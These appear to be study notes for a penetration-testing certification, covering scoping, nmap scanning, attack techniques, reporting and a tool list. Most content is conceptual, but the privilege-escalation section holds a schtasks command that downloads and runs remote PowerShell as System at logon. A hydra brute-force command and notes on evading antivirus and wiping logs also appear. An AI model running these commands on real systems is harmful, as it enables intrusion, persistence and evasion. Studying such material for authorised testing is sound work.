# Exam
---
* 1.0 Planning and Scoping 14%
* 2.0 Information Gathering and Vulnerability Scanning 22%
* 3.0 Attacks and Exploits 30%
* 4.0 Reporting and Communication 18%
* 5.0 Tools and Code Analysis 16%
---

<h2> 1.0 Planning and Scoping </h2>

Chapter summary: Get permission. Well define the scope

^Stages from PTES http://www.pentest-standard.org/index.php/Main_Page  
Pre-engagement Interactions  
Intelligence Gathering  
Threat Modeling  
Vulnerability Analysis  
Exploitation  
Post Exploitation  
Reporting  

^Planning avoiding wasting time  

Each part it is important to know the value and budget  

^Rules of engagement  
Target audince x expctation from the result of a pentest project    
Communication escalation path - important    

^Resources and budget

^Top to bootom agreement  
MSA -- Master service agreement  
SOW -- Statement of work - tasks on the project  
NDA -- Non-disclosure agreement  

^Standards and methodologies
- MITRE ATT&CK
- Open Web Application  Security Project (OWASP)
- National Institute of Standards  and Technology (NIST)
- Open-source Security Testing  Methodology Manual (OSSTMM)
- Penetration Testing Execution Standard (PTES)
- Information Systems Security Assessment Framework (ISSAF)

^Validate scope of engagement
- Question the client/review contracts
- Time management
- Strategy - Unknown-environment vs. known-environment testing
- threat actors


<h2> 2.0 Information Gathering and Vulnerability Scanning 22% </h2>

Scanning - survey  
types - networks, devices, computers, apps/services   

Enumeration target classes (hosts, networks, domains, users, groups, networks shares[link resources], web pages, apps, seriveces, tokens, social networking sites)

nmap -sP (ping sweep) ICMP  
arp-scan range broadcast message to check MAC address of the devices and detects targets  

Whois lookup / nslookup / DNS lookup subdomains

Packet crafting - creating specific network packets to gather info or carry out attacks  
- scapy https://scapy.net/ (differents protocols)  
- nc/netcat  
- ncat (nmap guys)  
- hping  
Packet inspection passive method- capturing and analyzing network packets - sniffing    
- Wireshark (*win machine Pcap - Ethernet packet capture library doesn't allow monitor mode)  
- tcpdump  
- aircrack-ng  

• Fingerprinting  
- Operating systems (OSs)  
- Networks  
- Network devices  
- Software  

Cryptography -Inspecting certificates  
Google dork 

Cloud vs. self-hosted (permission and procedures)  
Social media scraping  
- Key contacts/job responsibilities  
- Job listing/technology   

Application  
Decompilation  
Debbuging - running an executable in a controlled manner  
- Tools - windbg  

OSINT  
us-cert-cisa.gov  
nist.gov  
tenable.com  
JPcert  
CWE / CVE / CAPEC / Fulldisclosure  
Github or another source-code repo  
Tools: Shodan, recon-ng  

Vulnerability scanning
Discovery tests with ping sweep nmap -sP  
Full scan scans ports, services and vulns  

nmap cheat sheet https://www.stationx.net/nmap-cheat-sheet/  
Nmap Scripting Engine (NSE) scripts
-A Enables OS detection, version detection, script scanning, and traceroute (full scan with fingerprinting - too noisy)  // perl nikto.pl <target> // OpenVas (Nessus)  
-sV Attempts to determine the version of the service running on port (--version-intensity/light/all)  
-sT TCP connect port scan (Default w/o root privilege)   
-Pn Disable host discovery. Port scan only.  
-O  Remote OS detection using TCP/IP  stack fingerprinting  
-sU UDP port scan  
-sS stealth scan - attempt to avoid tripping defensive control thresholds  
-T 1-5 Paranoid(0), Sneaky, Polite, Normal, Aggressive, Insane(5) query throttling avoid to be blocked by IPS be aware of tarpit techs     
-script=vuln  
-p <ports> <target> port scan 

Compliance - scan for specific known vulns that would make a system non-compliant

Target considerations  
VMs, Containers docker/puppet /vagrant  

Be aware of client restrictions when running scans (i.e. bandwidth use, schedule,etc)  
Analyze the results of the scans
- Asset categorization Identify and rank theses assets by relative value  
- Adjudication determine which results are valid, check false positive  
- Prioritization of vulnerabilities  - low hanging fruits ease of exploit vs the payoff -- look for impact   

Leverage information  
Map vulnerabilities to potential exploits - Nmap vulners and vulscan scripts - Metasploit  
Prioritize activities in preparation for pentest  
rank assets -> rank vulns -> rank exploits  

Update the database of vulns x exploits via git    
`$ nmap --script nmap-vulners -sV 10.10.1.10`  
`$ nmap --script vulscan -sV 10.10.1.10`  -- look in more databases  
`$ nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV 10.10.1.10` - limit db

Common attack techniques  
Cross-compiling code - compile exploits for another OS - mingw-w64  
Changing exploit code can change their fingerprint(signature) and bypass AV detection - exploit modification  
Exploit chaining - use each exploit to gain access or explore some resource  
Social engineering  
Credential brute forcing  
Enlightened attacks -- dictionary (appropiate lists for the approach) x rainbow table - prehashed passwords  

Credential attacks  
THC Hydra
`$ hydra -L users.txt. -P passwords.txt ftp://10.10.1.10` - 'SecList git resource'  

Weaknesses in specialized systems  
ICS (Industrial Control Systems) - Environmental conditions   
SCADA (Supervisory Control and Data Acquisition) - is the control system that interfaces with industrial processes - they are hard to update  
PLCs (Programmable Logic Controllers) - are the electronic boards that power the manufacturer's processes 
Mobile - lack of updates, dangerous apps, rooting/jailbreak, etc  
IoT - security wide open  
Point-of-sale system  
Biomectrics - accuracy is still evolving (false positive and false negative - FAR/EER/FRR)  
Application containers - breaking out the sandbox - vms or dockers  
RTOS (Real-time operating system)  provide fast, lightweight services, not security    

<h2> 3.0 Attacks and Exploits 30% </h2> 

Social eng  
Phising -- spear / whaling / sms and voice  
In-person: Elicitation (info gathering), Interrogation (informal interviews), Impersonation (Pretending to be someone w/ authority IT or tech support), shourlder surfing, usb candy drop  
Motivation techniques:  
- Authority  
- Scarcity    
- Social proof  
- Urgency  
- Likeness  
- Fear  

• Network-based exploits  
Name resolution exploits:  
NETBIOS NBNS/ LLMNR  
ARP/ DNS poisoning - alter tables and sources  

SMB tcp ports 139 and 445 - some ransomware (eternalblue, wannacry) use smb to propagate  
SNMP (port number 161/162) exploits v1 is not secure default  
SMTP (25)  
- Open relay, local relay (phishing, spam, ect.) - avoid open relay  

FTP (21) 

• Man-in-the-middle exploits - new name On-path exploits attacker sit between the traffic -- summary a proxy  
DNS cache poisoning - attacker input wrong IPs addresses  
ARP spoofing - table local MAC addresses  
Pass the hash  - NTLM hash in windows env  
Replay attacks - repeat requests  
Relay attacks - traffic sent to another destination  
SSL stripping  - insecure comm  
Downgrade attack - insecure comm  
DoS/ stress test  
NAC bypass  
VLAN hopping  

• Wireless exploits
Broadcast data in wide open in the range of the resources  
tool aircrack-ng  
Evil twin - rogue WAP (same ESSID) used to eavesdrop -> Karma attack (Karma attacks radio machines automatically) It's actually a device that listens for an side request and pretends to be a valid webapp.So this device automatically sets up evil twins based on what the clients are attempting to connect  to.  
You can then use a downgrade attack, which is an attempt to negotiate or force a more insecure protocol.  
Deauthentication attacks - DoS attacks between user and WAP  
Fragmentation attacks - DoS attacks floods a network with datagram fragments  
Credential harvesting attacks - process of capturing or discovering valid login  
WPS implementation weaknesses - discover PIN  
Bluejacking - unsolicited messages to a device - send  
Bluesnarfing - stealing info from a device - receive  
RFID cloning  
Jamming - DoS attacks  
Repeating - receiving and retransmitting a signal to increase range  

• Application exploits  
injection attacks - sql, xss, xxe, html, command, code, etc  
Credential brute forcing  
xss - watering hole*  
CSRF / clickjacking  
Session hijacking / Redirect / default credentials / weak credentials / Kerberos exploits (Forged tickets to allow unauthorized access to resouces) 
Authorization -> Parameter pollution (providing custom input parameters to alter service/API operation)  
Insecure direct object reference IDOR  
Security misconfiguration -> directory traversal allows users to navigate outside a web server's root directory  
Cookie manipulation without httponly and secure flag  
File inclusion local or remote app refer a resource and executed  


• Code Vulnerabilities unsecure code  
Comments of sensitive data or obsolete or hml env in source code  
Lack of error handling  
hard-coded creds  
Race conditions - TOC/TOU - time of check/use the gap for the attack  
Unauthorized use of functions/unprotected APIs (integrations) - Unintended API usage  
hidden elements in XML/HTML  
Code signing - certificates can authenticate author's identity ensure integrity  

• Local Host vulns  
CVE database for each OS  
Linux specific Privilege escalation - SUID/SGID programs ( `-rwxr-sr-- 1 root root 148 Aug 13 03:46 file1.sh`)  
Ret2libc - stack overflow attack - replaces current stack return address  
Libc incluedes useful calls, such as 'system'  
Sticky bits - directory permission  
Priv esc windows - Cpassword - Group policy preference attribute that contains passwords  
- SYSVOL folder of the Domain Controller (encrypted XML)  
Clear text credentials in LDAP  
Kerberoasting - Domain users can query Kerberos tickets for other users  
Credentials in LSASS (Local security authority Subsystem service) - Enforces security policy  
Unattended installation - PXE (preboot execution env) - store in config files some info about valid credentials for a domain for example  
SAM database (security account manager - database that contains user passwords) local wkstations /machines  
DLL hijacking (dynamic Link library) - forcing a loader to load a malicious DLL - chain reaction  

• Misc. Priv escalation  
Exploitable services  
unquoted service paths - Allow abbreviated attack paths (without spaces) "Program[ ]Files
writable services - Allow attacker to replace services with malicious programs
Unsecure file/folder permissions - root installs allow read/write by any user  
keylogger in target
Scheduled tasks -   
`schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onlogon /ru System`  
Unpatched resource  
local host vulns - Default credentials,sandbox escape(shell upgrade/ vm escaping)  
Physical security - cold boot attack, JTAG debug(chips),serial port, piggybacking/tailgating, dumpster diving,lock bypass,badge cloning  
• Post-exploitation techniques  
Lateral movement - RPC/DCOM invoke services in remote devices- psExec (Utility that supports executing processes on other systems i.e telnet) / WMI (Windows management instrumentation) managing devices and apps from remote computers / Scheduled tasks  
PS remoting/WinRM - Powershell remoting / windows remote management  
SMB - protocol for exposing shares to remote computers  
RDP - remote desktop protocol  
VNC, X-server forwarding windows access to linux desktop / telnet unsecure remote access cleartext  
SSH; RSH/Rlogin legacy secure remote access  
• Persistence and Stealth  
Scheduled jobs - cron or task manager  
Scheduled task - schtasks  
Daemons - background processes or services  
Backdoors, trojan delivery mechanism malware, new user creation  
Clean up files, including tools installed, hiding files that you need to leave, sanitize logs files, remove any traces of activity to avoid post-mortem detection  

New content - Mobile , IOT and Cloud 


<h2> 4.0 Reporting and Communication 18% </h2>

Tell the story and know the audience/ motivation (audit?)  
- C-suite - executive summary  

Pen test report - digest of all activities and conclusions  
Leave the reader with a call to action  
Start writing your report early in the testing projetc - snow ball effect*   

Risk appetite amount of risk the client is willing to accept / tone of the entire report  

Report handling and disposition  

• Report contents  
- Executive summary  
- Scope details  
- Methodology  
 - Attack narrative  
- Findings  
 - Risk rating (reference framework)  
 - Risk prioritization  
 - Business impact analysis  
- Metrics and measures  
- Remediation  
- Conclusion  
- Appendix  

• Note taking  
- Ongoing documentation during test  
- Screenshots  

• Common themes/root causes  
- Vulnerabilities
- Observations
- Lack of best practices

Given a scenario, analyze the findings and recommend  the appropriate remediation within a report.    
Mitigation strategy categories - controls   
Give multiple alternatives to mitigate a problem    
People - behavior changes - social eng and passwords, phishing  
Process - how things are done - backup media handling, ID mgmt  
Technology - controls based on hard/software  

 Technical controls  
- System hardening  
- Sanitize user input/
 parameterize queries  
- Implemented multifactor 
 authentication  
- Encrypt passwords  
- Process-level remediation  
- Patch management  
- Key rotation  
- Certificate management  
- Secrets management solution  
- Network segmentation  
• Administrative controls  
- Role-based access control  
- Secure software   
 development life cycle  
- Minimum password requirements  
- Policies and procedures  
• Operational controls  
- Job rotation  
- Time-of-day restrictions  
- Mandatory vacations  
- User training  
• Physical controls  
- Access control vestibule  
- Biometric controls  
- Video surveillance  

 Communication path - bring muscle to resolve some issue -- managing communication expectations, including freqeuncy, reduces conflict
• Communication triggers  
- Critical findings  
- Status reports  
- Indicators of prior compromise  
• Reasons for communication - periodic reports or phases of the pentest    
- Situational awareness   
- De-escalation inform a critical risk     
- Deconfliction resolve conflict of any type pen test team vs op user/ service provider / management  (bring muscle or sponser to show the importance)   
- Identifying false positives  
- Criminal activity  
• Goal reprioritization unexpected impact/findings or org change   
• Presentation of findings  

 Post-engagement cleanup  
- Removing shells  
- Removing tester-created credentials    
- Removing tools  
clean up history - .bash_hystory files for example, delete artefacts
• Client acceptance - formal cessation of project activities    
• Lessons learned both sides client and pentester    
• Follow-up actions/retest  
• Attestation of findings independent review and assurance of findings (conduct by a third party for example)  
• Data destruction process  

<h2>5.0 Tools and Code Analysis 16%  </h2>

- Explain the basic concepts of scripting and software development  

- Given a scenario, analyze a script or code sample for use in a penetration test.  


- Explain use cases of the following tools during the phases of a penetration test.  (**The intent of this objective is NOT to test specific vendor feature sets.)  

nmap SYN packet (stealth) - nmap -sS target SYN/ACK and then nmap sends a RST packet  
Full connect scan nmap -sT target (complete the three way handshake more reliable)  
Service id nmap -Sv target --version-intensity 0 to 9  
Timing nmap -T[0-5]  
Output file nmap -oN(normal),-oX(xml file),-oG(.gnmap grepable file host per lines),-oA(all 3 types) <file> -- turn in a html output using another tool called  xsltproc:  
xsltproc <nmap-output.xml> -o <nmap-output.html>  
Saxon 9: java -jar saxon9.jar -s:<nmap-output.xml> -o:<nmap-output.html>  
Previous Saxon releases: java -jar saxon.jar -a <nmap-output.xml> -o <nmap-output.html>  
Xalan   
Using Xalan C++: Xalan -a <nmap-output.xml> -o <nmap-output.html>  
Using Xalan Java: java -jar xalan.jar -IN <nmap-output.xml> -OUT <nmap-output.html>  
OS fingerprinting -O detects target OS  
Option nmap -Pn skips host discovery  
Target input file -iL text file with tagets  
Toolbox  
reconnaissance: Nmap, whois, nslookup, theharvester,shodan ,censys ,recon-ng, aircrack, kismet, wifite, SET, wireshark, hping, metaspoloit framework  
enumeration: Nmap, nslookup, wireshark, hping  
Vuln scanning: Nmap, nikto, openVas, sqlmap, nessus, w3af, zap, metasploit framework  
credential attacks: offline password crack - hashcat, john the ripper, cain and abel, mimikatz, aircrack-ng
Brute force services - Sqlmap, medusa, hydra, cain and abel, mimikatz, patator, w3af, aircrak-ng  
Persistence: SET, beEF, ssh, ncat, netcat, drozer, powersploit, empire, metasploit framework  
Configuration compliance - nmap, nikto, openvas, nessus, sqlmap, nessus  
Evasion: SET, proxychains, metasploit framework  
Decompilation: Immunity debbuger, APKX, APK studio, jadx  
forensics: immunity debugger.  
Debugging: OLLYDBG, immunity debugger, GDB, WINDBG, IDA  
Software assurance: findsecbugs, sonarQube, YASCA / For fuzzing: Peach, AFL  
SAST / DAST  
Medusa, hydra, Patator and W3AF - online credential test  
Cain and Abel  and Mimikatz - online and offline  
pwdump7 - dump hashes windows  
Debbuger for linux only GBD  
Aircrack - monitoring, attacking testing , cracking  
Kismet - detector, sniffer and IDS  
WiFite - wrapper for other wireless tools  



